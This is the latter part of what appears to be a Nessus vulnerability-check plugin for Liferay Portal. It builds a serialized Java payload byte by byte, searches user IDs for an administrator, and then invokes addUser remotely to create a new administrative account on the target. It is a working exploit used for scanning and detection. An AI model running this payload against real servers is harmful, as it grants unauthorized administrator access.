    raw_string(0x00) +                                           # Unknown

    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL

    ##################################################################
    # MethodKey (http://www.nessus.org/u?2e2b1ab1)
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.kernel.util.MethodKey") +           # Class name
    raw_string(0xED, 0xDE, 0x26, 0xC5, 0xA1, 0xEE, 0x48, 0x3B) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x04) +                                     # Number of members in class

    # Member
    "L" +                                                        # Member type (object)
    jstr("_className") +                                         # Member name
    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_methodName") +                                        # Member name
    jref(0x007E0004) +                                           # Handle

    # Member
    "[" +                                                        # Array
    jstr("_parameterTypes") +                                    # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("[Ljava/lang/Class;") +                                 # Canonical JVM signature

    "L" +                                                        # Object
    jstr("_toString") +                                          # Data
    jref(0x007E0004) +                                           # Handle

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: _className
    raw_string(0x74) +                                           # TC_STRING
    jstr("com.liferay.portal.service.UserServiceUtil") +         # Class name

    # Value :: _methodName
    raw_string(0x74) +                                           # TC_STRING
    jstr("addUser") +                                            # Method name

    # Value :: _parameterTypes
    raw_string(0x75) +                                           # TC_ARRAY
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("[Ljava.lang.Class;") +                                 # Canonical JVM signature
    raw_string(0xAB, 0x16, 0xD7, 0xAE, 0xCB, 0xCD, 0x5A, 0x99) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x00) +                                     # Number of members in class
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    raw_string(0x00, 0x00, 0x00, 0x1A) +                         # Data

    ##################################################################
    # Long
    ##################################################################
    raw_string(0x76) +                                           # TC_CLASS
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("long") +                                               # Class name
    raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) + # Version UID of the class
    raw_string(0x00) +                                           # Flags
    raw_string(0x00, 0x00) +                                     # Number of members in class

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    ##################################################################
    # Boolean
    ##################################################################
    raw_string(0x76) +                                           # TC_CLASS
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("boolean") +                                            # Class name
    raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) + # Version UID of the class
    raw_string(0x00) +                                           # Flags
    raw_string(0x00, 0x00) +                                     # Number of members in class

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    ##################################################################
    # String
    ##################################################################
    raw_string(0x76) +                                           # TC_CLASS
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.lang.String") +                                   # Class name
    raw_string(0xA0, 0xF0, 0xA4, 0x38, 0x7A, 0x3B, 0xB3, 0x42) + # Data
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x00) +                                     # Number of members in class

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    jref(0x007E003F) +                                           # Handle

    jref(0x007E003D) +                                           # Handle

    jref(0x007E003F) +                                           # Handle

    jref(0x007E003F) +                                           # Handle

    jref(0x007E003B) +                                           # Handle

    jref(0x007E003F) +                                           # Handle

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x76) +                                           # TC_CLASS
    jref(0x007E0018) +                                           # Handle

    jref(0x007E003F) +                                           # Handle

    jref(0x007E003F) +                                           # Handle

    jref(0x007E003F) +                                           # Handle

    ##################################################################
    # Int
    ##################################################################
    raw_string(0x76) +                                           # TC_CLASS
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("int") +                                                # Class name
    raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) + # Version UID of the class
    raw_string(0x00) +                                           # Flags
    raw_string(0x00, 0x00) +                                     # Number of members in class

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    jref(0x007E0042) +                                           # Handle

    jref(0x007E003D) +                                           # Handle

    jref(0x007E0042) +                                           # Handle

    jref(0x007E0042) +                                           # Handle

    jref(0x007E0042) +                                           # Handle

    jref(0x007E003F) +                                           # Handle

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x76) +                                           # TC_CLASS
    jref(0x007E0023) +                                           # Handle

    jref(0x007E0043) +                                           # Handle

    jref(0x007E0043) +                                           # Handle

    jref(0x007E0043) +                                           # Handle

    jref(0x007E003D) +                                           # Handle

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x76) +                                           # TC_CLASS
    jref(0x007E0028) +                                           # Handle

    raw_string(0x70);                                            # TC_NULL
}

if (!thorough_tests) audit(AUDIT_THOROUGH);

app = "Liferay Portal";

# Get the ports that web servers have been found on, defaulting to
# what Liferay uses with Tomcat, their recommended bundle.
port = get_http_port(default:8080);

# Get details of the Liferay Portal install.
install = get_install_from_kb(appname:"liferay_portal", port:port, exit_on_fail:TRUE);
dir = install["dir"];

# All parameters in the protocol are big-endian.
set_byte_order(BYTE_ORDER_BIG_ENDIAN);

# Responses from the server that are protocol failures are just a slew
# of NULs.
failure = crap(data:raw_string(0x00), length:32);

params =
  "?p_p_id=58" +
  "&p_p_lifecycle=2" +
  "&p_p_resource_id=/api/liferay/";

loc = dir + "/";
url = build_url(port:port, qs:loc);

# Try and find the user ID of an administrator.
while (TRUE)
{
  # Get another user ID to try.
  id = next_id();
  if (isnull(id))
    break;

  # Create the payload to call getUserRoles().
  payload = payload_find(id:id, url:"/nessus");

  # Send the method invocation
  res = http_send_recv3(
    port         : port,
    method       : "POST",
    item         : loc + params,
    data         : payload,
    exit_on_fail : TRUE
  );

  # Earlier versions respond with a redirect.
  if (
    "<title></title>" >< res[2] &&
    "Location:" >< res[1]
  ) audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

  # Check if the server understood us. Failures due to packet errors and
  # permissions look the same, so flag the server as unaffected.
  if (res[2] == failure)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

  # Check if the user appears to be an administrator.
  if ("Administrators are super users who can do anything." >< res[2])
    break;
}

# Check if we found an administrator.
if (isnull(id))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

# Create a nonce to be used for our new user's screen name, since we
# don't want to run into the case that only the first scan with this
# plugin works due to name collisions.
#
# We can't include the plugin's name due to length restrictions.
nonce = "nessus-" +  unixtime();

# Create the payload to call addUser().
payload = payload_create(
  id        : id,
  user      : nonce,
  email     : nonce + "@example.com",
  firstname : "Nessus",
  lastname  : "Scanner",
  url       : "/nessus"
);

# Send the method invocation
res = http_send_recv3(
  port         : port,
  method       : "POST",
  item         : loc + params,
  data         : payload,
  exit_on_fail : TRUE
);

# Check if the server understood us. Failures due to packet errors and
# permissions look the same, so flag the server as unaffected.
if (res[2] == failure)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

# Check if the server accepted our command.
if ("Welcome Nessus Scanner" >!< res[2])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, url);

# Report our findings.
report = NULL;
if (report_verbosity > 0)
{
  report =
    '\nNessus was able to create a new user with administrative permissions' +
    '\nusing the following URL :' +
    '\n' +
    '\n  ' + url + params +
    '\n' +
    '\nThe following new administrative user was created :' +
    '\n' +
    '\n  Screen Name : ' + nonce +
    '\n  First Name  : Nessus' +
    '\n  Last Name   : Scanner' +
    '\n' +
    '\nNessus has not removed the user that it created. It is recommended' +
    '\nthat you delete it yourself.' +
    '\n';
}

security_hole(port:port, extra:report);
